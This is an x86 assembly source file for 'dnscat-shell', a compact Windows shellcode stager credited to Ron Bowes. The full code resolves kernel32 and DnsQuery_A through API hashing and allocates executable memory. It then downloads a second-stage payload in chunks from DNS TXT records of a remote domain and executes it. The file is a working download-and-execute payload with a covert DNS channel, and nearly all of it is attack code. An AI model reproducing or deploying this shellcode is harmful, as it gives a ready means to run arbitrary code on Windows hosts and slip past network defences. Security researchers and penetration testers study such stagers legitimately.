; dnscat-shell.asm
; By Ron Bowes
; Created March, 2010
;
; (See LICENSE.txt)
;
; This shellcode will download a shellcode stage over DNS (through TXT records)
; and run it. Being a stager, it is designed to be as smell as possible, 
; weighing in at only 236 bytes plus the domain name. 
;
; I opted to use a slightly modified version of the 'topstack' method of
; getting the kernel32.dll address, as well as a fairly standard find_function
; implementation, both from Skape's paper "Understanding Windows Shellcode".
;
; I tried using Metasploit's block_api.asm code, but, even after cleaning up
; everything else, it ended up being about 40 bytes longer. Since no function
; calls in here need to be modified by Metasploit (ie, there's no exitfunc
; here), I decided to stick with the smaller version.
BITS 32

; Load kernel32.dll
 xor ebx, ebx
call find_kernel32 ; Note: ebx has to be 0 when calling

; These pushes will be used later, when we no longer have the handle to kernel32.dll
push 0x91AFCA54 ; VirtualAlloc
push eax ; Address of kernel32.dll

; Get the LoadLibrary() function so we can load dnsapi.dll
push 0xEC0E4E8E ; LoadLibraryA
push eax ; Address of kernel32.dll
call find_function ; eax -> LoadLibrary()

; Load dnsapi.dll
call loadlibrary
 db 'dnsapi.dll',0
loadlibrary:
call eax ; LoadLibrary

; Get the address for DnsQuery_A
push 0xD6449D1C ; DnsQuery_A
push eax ; Address of dnsapi.dll
call find_function
xchg esi, eax ; esi -> DnsQuery_A

; Get the address of VirtualAlloc()
call find_function

; Allocate memory for our shellcode
push byte 0x40 ; PAGE_EXECUTE_READWRITE
add bh, 0x10
push ebx ; MEM_COMMIT (0x1000)
push ebx ; dwSize (0x1000)
push byte 0 ; lpAddress
call eax
xchg edi, eax ; edi -> allocated memory
push edi ; Save this for later (we're going to use 'ret' to jump into it)

main_top:

; Get the domain. The reason I do it here is so I can put the domain at the bottom,
; making it easier to modify for the user. 
 jmp get_domain
get_domain_top:
 pop ebx

 push byte 0x00 ; pReserved (has to be 0)
 push edi ; ptr to result set (we use edi because it's going to get whacked anyways)
 push byte 0x00 ; pExtra (has to be 0)
 push byte 0x08 ; Options (DNS_QUERY_BYPASS_CACHE)
 push byte 0x10 ; wType (DNS_TYPE_TEXT)
 push ebx ; Domain name
 call esi ; DnsQuery_A
 test eax, eax
 jnz done

 push esi ; Save
 mov esi, [edi]  ; ecx -> DNS_RECORD
 mov esi, [esi+28] ; ecx -> Data (TXT)
 xor ecx, ecx
 add cl, 255 ; This has to the STAGE_CHUNK_SIZE constant on dnscat
 rep movsb

 pop esi ; Restore
 ; This block increments the two-byte subdomain to choose which block
 ; we want to receive. Note that after '99' blocks, the behaviour will
 ; break (so 99 * CHUNK_SIZE is the longest possible stage). 
 inc ebx
 inc byte [ebx] ; Go to the next 
 cmp byte [ebx], '9'
 jle ok
 mov byte [ebx], '0'
 inc byte [ebx-1] ; Increment the second digit
ok:
jmp main_top

 done:

 ret ; Return into our memory (the top of the stack is the original return of VirtualAlloc()

;;; find_kernel32()
; Get kernel32.dll using the 'topstack' method, discussed
; in Skape's paper "Understanding Windows Shellcode"
; Modified to change some registers
find_kernel32:
;   push esi                      ; Save esi (we don't need esi)
;   xor  esi, esi                 ; Zero esi (we can assume that 'ebx' is zero)
   mov  eax, [fs:ebx + 0x4]      ; Extract TEB
   mov  eax, [eax - 0x1c]        ; Snag a function pointer that's 0x1c bytes into the stack
find_kernel32_base:
find_kernel32_base_loop:
   dec  eax                      ; Subtract to our next page
   xor  ax, ax                   ; Zero the lower half
   cmp  word [eax], 0x5a4d   ; Is this the top of kernel32?
   jne  find_kernel32_base_loop  ; Nope?  Try again.
find_kernel32_base_finished:
;   pop  esi                      ; Restore esi
   ret                           ; Return (if not used inline)

;;; find_function()
; Get an arbitrary function from a library, also as discussed
; in Skape's paper
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    
compute_hash:
    xor edi, edi
    xor eax, eax
    cld
compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret 8

get_domain: 
 call get_domain_top
 db '00.'
 db '123RANDOM.skullseclabs.org',0 ; REPLACETEST

